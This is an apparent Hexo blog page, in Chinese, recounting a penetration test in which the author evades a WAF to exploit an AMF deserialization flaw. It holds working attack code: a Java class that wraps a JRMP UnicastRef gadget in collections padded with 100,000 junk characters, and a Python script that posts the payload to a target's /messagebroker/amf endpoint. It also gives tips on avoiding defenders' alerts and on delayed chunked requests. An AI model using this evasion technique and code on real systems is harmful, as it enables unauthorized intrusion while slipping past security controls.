@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="tiehanhan" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+     daidaitiehanhan&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/avatar.gif">
+    <link rel="icon" href="/images/avatar.gif">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.gif" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">tiehanhan</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title"></div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-05-01 23:07:11
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <p>[toc]</p>
+<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>某项目遇到一个amf反序列化</p>
+<p>直接exp打发现没成功，抓包发现数据包被waf拦截了</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220425150216908.png" class="" title="image-20220425150216908">
+
+<h3 id="研究waf规则"><a href="#研究waf规则" class="headerlink" title="研究waf规则"></a>研究waf规则</h3><p>删掉一截字符，观察是不是waf对<code>/messagebroker/amf</code>路由有监控</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220425150256158.png" class="" title="image-20220425150256158">
+
+<p>发现数据包可以通行，那说明waf对这个路由是没有防护的，被拦大概率是因为序列化数据中有关键字触发了规则</p>
+<p>对字符的规则大概率是触发jrmp的这个类<code>sun.rmi.server.Unicastef</code>，随便删掉这个Class名的一部分</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220425150518833.png" class="" title="image-20220425150518833">
+
+<p>发现数据包也能正常发过去，那waf应该是对gadget中的Class名做了规则。</p>
+<p>尝试一些通用的思路例如chunked或者延时chunked，都搞不定。</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220425151003841.png" class="" title="image-20220425151003841">
+
+<p>没办法，尝试用大数据包试试，部分waf由于性能问题，遇到一些大数据包时，对超长的部分不会检查。</p>
+<p>为了避免在<code>/messagebroker/amf</code>这个路由测试的时候被拦太多waf告警引起防守方警觉，我们先在任意的其他目录测一下效果。</p>
+<p>直接发个3M的大数据包探探路，看看我们这个思路是否可行。</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220425152755839.png" class="" title="image-20220425152755839">
+
+<p>成功绕过waf，说明我们这个大数据包的思路是可行的。现在再小测一下waf大概的边界在哪，因为直接构造几M的大数据包生成payload都得等一会儿，咱们还是尽可能地构造一个”小的”大数据包。</p>
+<p>小逝一波5W大小的垃圾字符</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220425151456028.png" class="" title="image-20220425151456028">
+
+<p>搞不定，翻一倍，提高到10W试试</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220425152632634.png" class="" title="image-20220425152632634">
+
+<p>成功绕过。</p>
+<h3 id="poc构造"><a href="#poc构造" class="headerlink" title="poc构造"></a>poc构造</h3><p>但是显然咱们这样强行扔一堆垃圾数据到序列化数据中会导致amf的反序列化失败。想起<a target="_blank" rel="noopener" href="https://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/">c0ny1大师傅脏数据绕waf的文章</a>，我们这里的情景非常相似，可以抄袭大师傅的代码试试。</p>
+<p>我之前没有研究过amf反序列化，所以这里本地搭个环境测测，amf的反序列化是否也可以像java原生反序列化一样用数据结构包裹我们的gadget。</p>
+<p>试试用<code>arrayList</code>存放我们的gadget试试</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220425154149135.png" class="" title="image-20220425154149135">
+
+<p>成功收到请求</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220425153926413.png" class="" title="image-20220425153926413">
+
+<p>说明amf的反序列化也可以用数据结构插入脏数据来绕waf。</p>
+<p>参考<a target="_blank" rel="noopener" href="https://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/#0x03-%E6%94%B9%E9%80%A0ysoserial">c0ny1大师傅的代码</a>弄一个适配amf的版本，执行后在<code>/tmp/amf.ser</code>生成插入了100000大小脏数据的序列化数据。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Amfdemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> generateUnicastRef(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1234</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Amfdemo</span> <span class="variable">dirtyDataFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Amfdemo</span>(object,<span class="number">100000</span>);</span><br><span class="line">        <span class="type">byte</span>[] amf = serialize(dirtyDataFactory.doWrap());</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/tmp/amf.ser&quot;</span>);			<span class="comment">//构造好的序列化数据</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        fos.write(amf, <span class="number">0</span>, amf.length);</span><br><span class="line">        fos.flush();</span><br><span class="line">        fos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化对象</span></span><br><span class="line">        <span class="comment">//ActionMessage actionMessage = deserialize(amf);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">generateUnicastRef</span><span class="params">(String host, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        java.rmi.server.<span class="type">ObjID</span> <span class="variable">objId</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.server.ObjID();</span><br><span class="line">        sun.rmi.transport.tcp.<span class="type">TCPEndpoint</span> <span class="variable">endpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">sun</span>.rmi.transport.tcp.TCPEndpoint(host, port);</span><br><span class="line">        sun.rmi.transport.<span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">sun</span>.rmi.transport.LiveRef(objId, endpoint, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">sun</span>.rmi.server.UnicastRef(liveRef);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object data) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">MessageBody</span> <span class="variable">body</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MessageBody</span>();</span><br><span class="line">        body.setData(data);</span><br><span class="line">        <span class="type">ActionMessage</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActionMessage</span>();</span><br><span class="line">        message.addBody(body);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">AmfMessageSerializer</span> <span class="variable">serializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AmfMessageSerializer</span>();</span><br><span class="line">        serializer.initialize(SerializationContext.getSerializationContext(), out, <span class="literal">null</span>);</span><br><span class="line">        serializer.writeMessage(message);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ActionMessage <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] amf)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(amf);</span><br><span class="line">        <span class="type">AmfMessageDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AmfMessageDeserializer</span>();</span><br><span class="line">        deserializer.initialize(SerializationContext.getSerializationContext(), in, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">ActionMessage</span> <span class="variable">actionMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActionMessage</span>();</span><br><span class="line">        deserializer.readMessage(actionMessage, <span class="keyword">new</span> <span class="title class_">ActionContext</span>());</span><br><span class="line">        <span class="keyword">return</span> actionMessage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> dirtyDataSize; <span class="comment">//脏数据大小</span></span><br><span class="line">        <span class="keyword">private</span> String dirtyData; <span class="comment">//脏数据内容</span></span><br><span class="line">        <span class="keyword">private</span> Object gadget; <span class="comment">// ysoserila gadget对象</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Amfdemo</span><span class="params">(Object gadget, <span class="type">int</span> dirtyDataSize)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.gadget = gadget;</span><br><span class="line">            <span class="built_in">this</span>.dirtyDataSize = dirtyDataSize;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将脏数据和gadget对象存到集合对象中</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> 一个包裹脏数据和gadget对象可序列化对象</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">doWrap</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            dirtyData = getLongString(dirtyDataSize);</span><br><span class="line">            <span class="type">int</span> <span class="variable">type</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * <span class="number">10</span>) % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    List&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">                    arrayList.add(dirtyData);</span><br><span class="line">                    arrayList.add(gadget);</span><br><span class="line">                    wrapper = arrayList;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    List&lt;Object&gt; linkedList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Object&gt;();</span><br><span class="line">                    linkedList.add(dirtyData);</span><br><span class="line">                    linkedList.add(gadget);</span><br><span class="line">                    wrapper = linkedList;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    HashMap&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">                    map.put(<span class="string">&quot;a&quot;</span>, dirtyData);</span><br><span class="line">                    map.put(<span class="string">&quot;b&quot;</span>, gadget);</span><br><span class="line">                    wrapper = map;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    LinkedHashMap&lt;String, Object&gt; linkedHashMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, Object&gt;();</span><br><span class="line">                    linkedHashMap.put(<span class="string">&quot;a&quot;</span>, dirtyData);</span><br><span class="line">                    linkedHashMap.put(<span class="string">&quot;b&quot;</span>, gadget);</span><br><span class="line">                    wrapper = linkedHashMap;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    TreeMap&lt;String, Object&gt; treeMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;String, Object&gt;();</span><br><span class="line">                    treeMap.put(<span class="string">&quot;a&quot;</span>, dirtyData);</span><br><span class="line">                    treeMap.put(<span class="string">&quot;b&quot;</span>, gadget);</span><br><span class="line">                    wrapper = treeMap;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> wrapper;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 生产随机字符串</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> length 随机字符串长度</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> 随机字符串</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span>  String <span class="title function_">getLongString</span><span class="params">(<span class="type">int</span> length)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">                str += <span class="string">&quot;x&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>搞个python脚本把序列化数据发出去</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">headers = &#123;</span><br><span class="line"> <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">target=<span class="string">&quot;https://xxxx/messagebroker/amf&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"> f = <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/xxxx/Desktop/xx1.ser&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> payload = f.read()</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;==========================================================&quot;</span>)</span><br><span class="line"> <span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;==========================================================&quot;</span>)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">try</span>:</span><br><span class="line">    resp = requests.post(target, timeout=<span class="number">5</span>, headers=headers,data=payload, proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:4567&#x27;</span>,<span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;127.0.0.1:4567&#x27;</span>&#125;, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Status code: %i&quot;</span> % resp.status_code)</span><br><span class="line"> <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> main()</span><br></pre></td></tr></table></figure>
+
+<p>构造10W大小的垃圾字符发包</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220425155601595.png" class="" title="image-20220425155601595">
+
+<p>顺利拿下</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220425144934468.png" class="" title="image-20220425144934468">
+
+
+
+<h3 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h3><p>后面又遇到一个amf，发3M的大包也绕不过，但是通过未知的HTTP请求配合延时chunked成功触发</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220426134836814.png" class="" title="image-20220426134836814">
+
+<p>收到jrmp请求</p>
+<img src="/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/image-20220426134818214.png" class="" title="image-20220426134818214">
+
+
+
+
+
+
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-05-01 23:07:11
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-text">背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6waf%E8%A7%84%E5%88%99"><span class="toc-text">研究waf规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc%E6%9E%84%E9%80%A0"><span class="toc-text">poc构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%A9%E8%9B%8B"><span class="toc-text">彩蛋</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/daidaitiehanhan">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Copyright © 2022 tiehanhan</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Theme by tiehanhan | Powered by tiehanhan</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
